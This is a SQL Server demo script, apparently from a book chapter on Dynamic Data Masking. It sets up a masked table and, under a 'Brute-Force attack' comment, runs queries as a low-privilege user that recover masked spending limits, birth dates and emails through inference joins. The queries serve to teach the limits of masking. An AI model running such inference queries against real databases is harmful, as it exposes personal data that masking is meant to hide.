/****************************************************************************/
/*                       Pro SQL Server Internals                           */
/*      APress. 2nd Edition. ISBN-13: 978-1484219638 ISBN-10:1484219635     */
/*                                                                          */
/*                  Written by Dmitri V. Korotkevitch                       */
/*                      http://aboutsqlserver.com                           */
/*                        dk@aboutsqlserver.com                             */
/****************************************************************************/
/*                   Chapter 05. SQL Server 2016 Feautes                    */
/*                 Dmitri Korotkevitch with Thomas Grohser                  */
/*                         Dynamic Data Masking                             */
/****************************************************************************/

use SQLServerInternals
go

drop user if exists NonPrivUser;
drop table if exists dbo.Consultants;
go

create table dbo.Consultants  
(
	ID int not null,
	FirstName varchar(32) 
		masked with (function='partial(1,"XXXXXXXX",0)') not null,
	LastName varchar(32) not null,
	DateOfBirth date
		masked with (function='default()') not null, 
	SSN char(12)
		masked with (function='partial(0,"XXX-XX-",4)') not null,
	EMail nvarchar(255) 
		masked with (function='email()') not null,
	SpendingLimit money 
		masked with (function='random(500,1000)') not null
);

insert into dbo.Consultants(ID,FirstName,LastName,DateOfBirth,SSN,Email,SpendingLimit)
values 
    (1,'Thomas','Grohser','1/1/1980','123-45-6789','tg@grohser.com',10000)
	,(2,'Dmitri','Korotkevitch','1/1/1981','234-56-7890','dk@aboutsqlserver.com',10000);
go

create user NonPrivUser without login;
grant select on dbo.Consultants to NonPrivUser;
grant showplan to NonPrivUser;
go

select * from dbo.Consultants;

/* Impersonating */
execute as user = 'NonPrivUser';
select * from dbo.Consultants
revert;
go

/* Brute-Force attack */
execute as user = 'NonPrivUser';

;with N1(C) as (select 0 union all select 0) -- 2 rows    
,N2(C) as (select 0 from N1 as T1 CROSS JOIN N1 as T2) -- 4 rows    
,N3(C) as (select 0 from N2 as T1 CROSS JOIN N2 as T2) -- 16 rows    
,N4(C) as (select 0 from N3 as T1 CROSS JOIN N3 as T2) -- 256 rows    
,N5(C) as (select 0 from N4 as T1 CROSS JOIN N4 as T2) -- 65,536 rows  
,PossibleValues(SpendingLimit) 
as (select row_number() over (order by (select NULL)) from N5)    
select c.ID, p.SpendingLimit - 1, c.SpendingLimit as [Masked Limit]
from dbo.Consultants c join PossibleValues p on
		c.SpendingLimit >= p.SpendingLimit - 1 and 
		c.SpendingLimit < p.SpendingLimit;

revert;
go

execute as user = 'NonPrivUser';

;with N(n) 
as 
(
    select n 
    from (values (0),(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15)) n(n)
)
,C(c)
as 
( 
    select char(n1.n * 16 + n2.n) from n as n1 cross join n as n2 
) 
select 
    d.id,
    bd1.c+bd2.c+bd3.c+bd4.c+'/'+bd5.c+bd6.c+'/'+bd7.c+bd8.c as DateOfBirth,
    email1.c+email2.c+email3.c+email4.c+email5.c+email6.c+
    isnull(email7.c,'')+isnull(email8.c, '')+isnull(email9.c, '')+
        isnull(email10.c, '')+isnull(email11.c, '')+isnull(email12.c, '')+
        isnull(email13.c, '')+isnull(email14.c, '')+isnull(email15.c, '')+
        isnull(email16.c, '')+isnull(email17.c, '')+isnull(email18.c, '')+
        isnull(email19.c, '')+isnull(email20.c, '')+isnull(email21.c, '')+
        isnull(email22.c, '')+isnull(email23.c, '')+isnull(email24.c, '') as Email
from dbo.Consultants d
    left join c bd1 on ascii(substring(cast(d.DateOfBirth as varchar),1,1))=ascii(bd1.c)
    left join c bd2 on ascii(substring(cast(d.DateOfBirth as varchar),2,1))=ascii(bd2.c)
    left join c bd3 on ascii(substring(cast(d.DateOfBirth as varchar),3,1))=ascii(bd3.c)
    left join c bd4 on ascii(substring(cast(d.DateOfBirth as varchar),4,1))=ascii(bd4.c)
    left join c bd5 on ascii(substring(cast(d.DateOfBirth as varchar),6,1))=ascii(bd5.c)
    left join c bd6 on ascii(substring(cast(d.DateOfBirth as varchar),7,1))=ascii(bd6.c)
    left join c bd7 on ascii(substring(cast(d.DateOfBirth as varchar),9,1))=ascii(bd7.c)
    left join c bd8 on ascii(substring(cast(d.DateOfBirth as varchar),10,1))=ascii(bd8.c)
    left join c email1 on ascii(substring(d.EMail, 1, 1)) = ascii(email1.c)
    left join c email2 on ascii(substring(d.EMail, 2, 1)) = ascii(email2.c)
    left join c email3 on ascii(substring(d.EMail, 3, 1)) = ascii(email3.c)
    left join c email4 on ascii(substring(d.EMail, 4, 1)) = ascii(email4.c)
    left join c email5 on ascii(substring(d.EMail, 5, 1)) = ascii(email5.c)
    left join c email6 on ascii(substring(d.EMail, 6, 1)) = ascii(email6.c)
    left join c email7 on ascii(substring(d.EMail, 7, 1)) = ascii(email7.c)
    left join c email8 on ascii(substring(d.EMail, 8, 1)) = ascii(email8.c)
    left join c email9 on ascii(substring(d.EMail, 9, 1)) = ascii(email9.c)
    left join c email10 on ascii(substring(d.EMail, 10, 1)) = ascii(email10.c)
    left join c email11 on ascii(substring(d.EMail, 11, 1)) = ascii(email11.c)
    left join c email12 on ascii(substring(d.EMail, 12, 1)) = ascii(email12.c)
    left join c email13 on ascii(substring(d.EMail, 13, 1)) = ascii(email13.c)
    left join c email14 on ascii(substring(d.EMail, 14, 1)) = ascii(email14.c)
    left join c email15 on ascii(substring(d.EMail, 15, 1)) = ascii(email15.c)
    left join c email16 on ascii(substring(d.EMail, 16, 1)) = ascii(email16.c)
    left join c email17 on ascii(substring(d.EMail, 17, 1)) = ascii(email17.c)
    left join c email18 on ascii(substring(d.EMail, 18, 1)) = ascii(email18.c)
    left join c email19 on ascii(substring(d.EMail, 19, 1)) = ascii(email19.c)
    left join c email20 on ascii(substring(d.EMail, 20, 1)) = ascii(email20.c)
    left join c email21 on ascii(substring(d.EMail, 21, 1)) = ascii(email21.c)
    left join c email22 on ascii(substring(d.EMail, 22, 1)) = ascii(email22.c)
    left join c email23 on ascii(substring(d.EMail, 23, 1)) = ascii(email23.c)
    left join c email24 on ascii(substring(d.EMail, 24, 1)) = ascii(email24.c)

revert;
go
